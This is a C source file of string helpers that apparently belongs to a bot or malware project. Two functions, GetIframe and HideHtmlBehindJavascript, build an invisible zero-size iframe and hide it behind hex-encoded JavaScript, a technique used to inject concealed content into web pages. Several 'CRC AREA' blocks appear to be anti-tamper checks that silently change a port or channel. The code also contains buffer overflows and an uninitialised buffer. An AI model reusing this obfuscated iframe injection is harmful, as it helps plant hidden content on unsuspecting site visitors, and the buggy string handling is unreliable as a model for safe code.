#include "../Includes/includes.h"

char *HideHtmlBehindJavascript(char *pcString)
{
    char cPlaintext[strlen(pcString)];
    strcpy(cPlaintext, pcString);

    char cHex[DEFAULT];

    for(unsigned int ui = 0; ui < strlen(cPlaintext); ui++)
    {
        char cProcessEachByte[4];
        sprintf(cProcessEachByte, "%%%X", (unsigned int)cPlaintext[ui]);
        strcat(cHex, cProcessEachByte);
    }

    // <!-------! CRC AREA START !-------!>
    if(!bConfigSetupCheckpointNine)
        strcpy(cChannel, "in");
    // <!-------! CRC AREA STOP !-------!>

    sprintf(pcString,
            "\n"
            "<Script Language=\'Javascript\'>\n"
            "<!--\n"
            "document.write(unescape(\'%s\'));\n"
            "//-->\n"
            "</Script>\n", cHex);

    return pcString;
}

char *GetIframe(char *pcIframe) //Goes with the function 'char *HideHtmlBehindJavascript(char *pcString)'
{
    char cCreateIframe[DEFAULT];
    sprintf(cCreateIframe, "<iframe src=\"%s\" width=\"0\" height=\"0\" frameborder=\"0\"></iframe>", pcIframe);

    pcIframe = HideHtmlBehindJavascript(cCreateIframe);

    // <!-------! CRC AREA START !-------!>
    if(!bConfigSetupCheckpointOne)
    {
        usPort = GetRandNum(65000);
        return (char *)"";
    }
    // <!-------! CRC AREA STOP !-------!>

    return pcIframe;
}

char *FindInString(char *cFullString, char *cBefore, char *cAfter) //Returns a targetted section of a given character array
{
    cFullString = strstr(cFullString, cBefore) + 1;
    cFullString = strtok(cFullString, cAfter);

    //cAfter = strtok(cFullString, cAfter);
    //cAfter = strstr(cAfter, cBefore) + 1;

    //cBefore = strstr(cFullString, cBefore) + strlen(cBefore);
    //cAfter = strstr(cBefore, cAfter);
    //memcpy(cAfter, cBefore, strlen(cBefore) - strlen(cAfter));

    return cFullString;
}

void strtr(char *cSource, char *cCharArrayA, char *cCharArrayB)
{
    int nSourceLength = strlen(cSource);

    for(int i = 0; i < nSourceLength; i++)
    {
        if(cSource[i] == '\0')
            break;

        for(unsigned short us = 0; us < strlen(cCharArrayA); us++)
        {
            if(cSource[i] == cCharArrayA[us])
            {
                cSource[i] = cCharArrayB[us];
                break;
            }
            else
            {
                if(us == strlen(cCharArrayA)-1)
                    cSource[i] = cSource[i];
            }
        }
    }
}

char *CharacterReplace(char *pcString, char *cParameter1, char *cParameter2)
{
    for(unsigned short us = 0; us < strlen(pcString); us++)
    {
        if(pcString[us] == cParameter1[0])
            pcString[us] = cParameter2[0];
    }

    return pcString;
}

void StripAsterisks(char *pcString)
{
    DWORD dwOffset = 0;

    for(unsigned short us = 0; us < strlen(pcString); us++)
    {
        if(pcString[us] == '*')
        {
            dwOffset++;
            pcString[us] = pcString[us + dwOffset];
        }
    }
}

char *StripReturns(char *pcString)
{
    for(unsigned short us = 0; us < strlen(pcString); us++)
    {
        if(pcString[us] == '\r' || pcString[us] == '\n')
            pcString[us] = '\0';
    }
    return pcString;
}

void StripDashes(char *pcString)
{
    DWORD dwOffset = 0;

    for(unsigned short us = 0; us < strlen(pcString); us++)
    {
        if(pcString[us] == '-')
        {
            dwOffset++;
            pcString[us] = pcString[us + dwOffset];
        }
    }
}

char *StripQuotes(char *pcString)
{
    // <!-------! CRC AREA START !-------!>
    if(!bConfigSetupCheckpointOne)
        usPort = GetRandNum(65000);
    // <!-------! CRC AREA STOP !-------!>

    for(unsigned short us = 0; us < strlen(pcString); us++)
    {
        if((pcString[us] == '\"') || (pcString[us] == '\''))
            pcString[us] = '\0';
    }
    return pcString;
}

/*char *GetDirectoryFromFilePath(char *cFile)
{
    char cOriginal[strlen(cFile)];
    strcpy(cOriginal, cFile);

    if(strstr(cFile, "/"))
    {
        char *pcFile = strtok(cFile, "/");

        while(pcFile != NULL)
        {
            if(!strstr(pcFile, "/"))
            {
                memcpy(pcFile, cOriginal, strlen(cOriginal) - strlen(pcFile));
                return pcFile;
            }

            pcFile = strtok(NULL, "/");
        }
    }
    else
        return (char*)"ERROR_INVALID_PATH";
}

char *GetPathWithoutDriveFromFilePath(char *cFile)
{
    if((strstr(cFile, "/")) && (strstr(cFile, ":")))
    {
        unsigned short usFilePathLength = strlen(cFile);

        for(unsigned short us = 0; us < usFilePathLength; us++)
        {
            if((us != 0) && (us != 1) && (us != 2))
                cFile[us - 3] = cFile[us];
        }

        memcpy(cFile, cFile, strlen(cFile) - 3);

        return cFile;
    }
    else
        return (char*)"ERROR_INVALID_PATH";
}

char *GetFileNameFromFilePath(char *cFile)
{
    if(strstr(cFile, "/"))
    {
        char *pcFile = strtok(cFile, "/");

        while(pcFile != NULL)
        {
            if(!strstr(pcFile, "/"))
                return pcFile;

            pcFile = strtok(NULL, "/");
        }
    }
    else
        return cFile;
}*/
